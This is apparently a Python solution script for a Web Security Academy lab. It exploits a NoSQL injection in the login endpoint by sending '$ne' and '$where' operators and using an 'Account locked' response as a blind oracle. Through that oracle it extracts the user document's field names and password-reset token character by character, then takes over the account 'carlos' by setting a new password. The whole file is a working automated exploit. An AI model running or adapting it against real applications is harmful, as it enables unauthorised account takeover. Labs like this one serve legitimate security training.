import http.client
import json
import re
import ssl
import urllib

LAB_ID = "???"


def GET_forgotpassword() -> http.client.HTTPResponse:
    method, path = 'GET', '/forgot-password'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_changepassword(
        token_field_name: str,
        token_value: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', f'/forgot-password?{token_field_name}={token_value}'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_forgotpassword(
        csrf: str,
        session: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/forgot-password'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/forgot-password',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = [
        ('csrf', csrf),
        ('username', 'carlos'),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def change_password(
        csrf: str,
        session: str,
        token_field_name: str,
        token: str,
        password: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/forgot-password'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/forgot-password',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = [
        ('csrf', csrf),
        (token_field_name, token),
        ('new-password-1', password),
        ('new-password-2', password),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_login(
        where: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'content-type': 'application/json',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'te': 'trailers',
    }
    fields = {
        "username": "carlos",
        "password": {
            "$ne": "",
        },
        "$where": where,
    }
    body = json.dumps(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def forgot_password_csrf() -> tuple[str, str]:
    response = GET_forgotpassword()
    cookie_header = response.getheader('set-cookie')
    response_body= response.read().decode('utf-8')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response_body)[0]
    return session, csrf

def change_password_csrf(
        token_field_name: str,
        token_value: str,
) -> tuple[str, str]:
    response = GET_changepassword(token_field_name, token_value)
    response_body= response.read().decode('utf-8')
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response_body)[0]
    return session, csrf


def evaluate(expr: str) -> bool:
    response = POST_login(expr)
    if response.status != 200:
        raise Exception(f"response status: {response.status}")
    return 'Account locked' in response.read().decode('utf-8')


def fields_number() -> int:
    for i in range(100):
        if evaluate(f"Object.keys(this).length == {i}"):
            return i
    else:
        raise Exception("Could not find fields num")


def field_name_length(field_pos: int) -> int:
    for i in range(100):
        if evaluate(f"Object.keys(this)[{field_pos}].length == {i}"):
            return i
    else:
        raise Exception(f"Could not find field name length at pos: {field_pos}")


characters = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    '~', '`', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=', '{', '}',
    '[', ']', '|', '\\', '/', ':', ';', '"', '\'', '<', '>', ',', '.', ' ', ',', '?',
]


def field_name_char(field_pos: int, char_pos: int) -> str:
    for i in characters:
        if evaluate(f"Object.keys(this)[{field_pos}][{char_pos}] == '{i}'"):
            return i
    else:
        raise Exception(f"Could not find field {field_pos} char at pos: {char_pos}")


def field_name(field_pos: int) -> str:
    result = ""
    name_length = field_name_length(field_pos)
    print(f"field at pos {field_pos} has {name_length} characters")
    for i in range(name_length):
        result += field_name_char(field_pos, i)
    return result


def field_names() -> list[str]:
    result = []
    number = fields_number()
    print(f"found {number} fields")
    for i in range(number):
        name = field_name(i)
        result.append(name)
        print(f"found field name {name} at pos {i}")
    return result


def field_length(field_name: str) -> int:
    for i in range(100):
        if evaluate(f"""this.{field_name}.length == {i}"""):
            return i
    else:
        raise Exception(f"could not find field {field_name} value length")


def field_value_char(field_name: str, char_pos: int) -> str:
    for i in characters:
        if evaluate(f"""this.{field_name}[{char_pos}] == '{i}'"""):
            return i
    else:
        raise Exception(f"could not find field {field_name} value char at pos {char_pos}")


def field_value(field_name: str) -> str:
    value_length = field_length(field_name)
    print(f"found field {field_name} length: {value_length}")
    result = ""
    for i in range(value_length):
        result += field_value_char(field_name, i)
    return result


old_field_names = field_names()
print(f"field names before reset password: {old_field_names}")
session, csrf = forgot_password_csrf()
response = POST_forgotpassword(csrf, session)  # generate reset password token in the db
if response.status == 200 and 'Please check your email for a reset password link' in response.read().decode('utf-8'):
    print("successfully generated reset password token")
new_field_names = field_names()
print(f"field names after reset password: {new_field_names}")
token_field_name = [name for name in new_field_names if name not in old_field_names][0]
print(f"found token field name: {token_field_name}")
token = field_value(token_field_name)
print(f"password reset token for carlos: {token}")
session, csrf = change_password_csrf(token_field_name, token)
new_password = "123456"
response = change_password(csrf, session, token_field_name, token, new_password)
if response.status == 302:
    print(f"successfully changed password for user carlos to {new_password}")
else:
    print(response.status)
    print(response.headers)
    print(response.read())
